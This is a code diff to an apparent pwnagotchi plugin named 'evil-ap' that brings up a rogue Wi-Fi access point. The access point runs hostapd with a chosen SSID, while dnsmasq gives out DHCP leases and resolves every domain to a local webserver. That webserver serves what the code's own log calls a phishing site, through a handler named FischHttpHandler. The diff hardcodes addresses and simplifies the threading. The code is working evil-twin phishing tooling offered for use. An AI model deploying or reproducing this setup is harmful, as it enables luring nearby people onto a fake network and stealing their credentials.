@@ -1,7 +1,7 @@
 import time
 import logging
 import subprocess
-import threading
+import _thread
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 from pwnagotchi import plugins
@@ -10,7 +10,7 @@ from pwnagotchi.utils import StatusFile
 
 HOSTAPD_CONFIG = """
 interface={iface}
-driver=nl80211
+driver={driver}
 ssid={ssid}
 hw_mode=g
 channel=6
@@ -265,22 +265,6 @@ class FischHttpHandler(BaseHTTPRequestHandler):
 
         self.send_error(404)
 
-class FischThread(threading.Thread):
-    def __init__(self, webserver, *args, **kwargs):
-        super(FischThread, self).__init__(*args, **kwargs)
-        self._stop = threading.Event()
-        self._web = webserver
-
-    def run(self):
-        while not self.stopped():
-            self._web.handle_request()
-
-    def stop(self):
-        self._stop.set()
-
-    def stopped(self):
-        return self._stop.is_set()
-
 class EvilAp(plugins.Plugin):
     __author__ = '33197631+dadav@users.noreply.github.com'
     __version__ = '0.0.1'
@@ -301,87 +285,50 @@ class EvilAp(plugins.Plugin):
         self.ready = EvilAp.check_requirements()
         logging.info("[evil-ap] %s", "is loaded." if self.ready else "could not be loaded (missing required packages).")
 
-    def on_bored(self, agent):
+    def on_ready(self, agent):
         if not self.ready:
             return
 
         cfg = agent.config()
         display = agent.view()
 
-        display.set('status', 'Pause pwning, starting evil AP')
+        display.set('status', 'Starting evil AP')
         display.set('face', '( •̀ᴗ•́ )')
         display.update(force=True)
-        display._frozen = True
 
-        logging.debug("[evil-ap] Unit is sad, let's change that.")
-
-        # steps:
-        ## 1. pause bettercap and auto/ai mode
-        logging.debug("[evil-ap] Pausing threads (30s)...")
-        agent.pause()
-        time.sleep(30)
-        logging.debug("[evil-ap] Stop monitor mode...")
-        agent.stop_monitor_mode()
-
-        ## 2. start dnsmasq, hostapd and some fake-login-site
         logging.debug("[evil-ap] Configure ip addresses...")
-
-        # set gateway and webserver-ip to iface
-        for ip in [self.options['gateway'], self.options['webserver']]:
-            ip_proc = subprocess.Popen(f"ip addr add {ip}/{self.options['dhcp-netmask']} dev {self.options['iface']}".split(),
+        for ip in ['192.168.4.1', '192.168.4.100']:
+            ip_proc = subprocess.Popen(f"ip addr add {ip}/255.255.255.0 dev {self.options['iface']}".split(),
                     shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
             ip_proc.wait()
 
         # webserver
-        bettercap_http = agent.is_module_running('http.server')
-        if bettercap_http:
-            logging.debug("[evil-ap] Stop bettercap http.server module...")
-            agent.stop_module('http.server')
-        web = HTTPServer((self.options['webserver'], self.options['port']), FischHttpHandler)
-        web_thread = FischThread(web)
         logging.debug("[evil-ap] Start webserver with phishing site...")
-        web_thread.start()
+        web = HTTPServer(('192.168.4.100', 80), FischHttpHandler)
+        web_thread = _thread.start_new_thread(web.serve_forever, ())
 
         dev_null = open("/dev/null", "w")
         dnsmasq = [
             "dnsmasq",
-            "--no-daemon", # don't deamonize
             "--no-hosts", # don't read the hostnames in /etc/hosts.
             "--interface=%s" % self.options['iface'], # listen on this interface
             "--no-poll", # Don't poll /etc/resolv.conf for changes.
             "--no-resolv",
-            "--dhcp-range=%s,%s,%s,24h" % (self.options['dhcp-min'], self.options['dhcp-max'], self.options['dhcp-netmask']),
-            "--dhcp-option=3,%s" % self.options['gateway'], # gateway
-            "--dhcp-option=6,%s" % self.options['dns-server'], # dns-server
-            "--address=/#/%s" % self.options['webserver']
+            "--dhcp-range=192.168.4.2,192.168.4.99,255.255.255.0,24h",
+            "--dhcp-option=3,192.168.4.1", # gateway
+            "--dhcp-option=6,192.168.4.1", # dns-server
+            "--address=/#/192.168.4.100"
         ]
         logging.debug("[evil-ap] Start dnsmasq...")
         dns_proc = subprocess.Popen(dnsmasq, shell=False, stdout=dev_null, stdin=None, stderr=dev_null)
 
-        hostap_cfg = HOSTAPD_CONFIG.format(iface=self.options['iface'], ssid=self.options['ssid'])
+        hostap_cfg = HOSTAPD_CONFIG.format(**self.options)
         hostapd = [
             "hostapd",
+            "-B",
             "/dev/stdin"
         ]
-        hostapd_proc = subprocess.Popen(hostapd, shell=False, stdout=dev_null, stdin=subprocess.PIPE, stderr=dev_null)
-        hostapd_proc.communicate(input=str.encode(hostap_cfg))
         logging.debug("[evil-ap] Start hostapd...")
 
-        ## 3. wait for user input (use a timeout like 15 mins)
-        display._frozen = False
-        display.set('status', f"Evil AP is running for {self.options['time']/60} mins")
-        display.update(force=True)
-        display._frozen = True
-        time.sleep(self.options['time'])
-
-        ## 4. switch back to pwnagotchi mode
-        display._frozen = False
-        hostapd_proc.kill()
-        dns_proc.kill()
-        web_thread.stop()
-
-        logging.debug("[evil-ap] Times up, continue pwning...")
-        if bettercap_http:
-            agent.start_module('http.server')
-        agent.start_monitor_mode()
-        agent.cont()
+        hostapd_proc = subprocess.Popen(hostapd, shell=False, stdout=dev_null, stdin=subprocess.PIPE, stderr=dev_null)
+        hostapd_proc.communicate(input=str.encode(hostap_cfg))
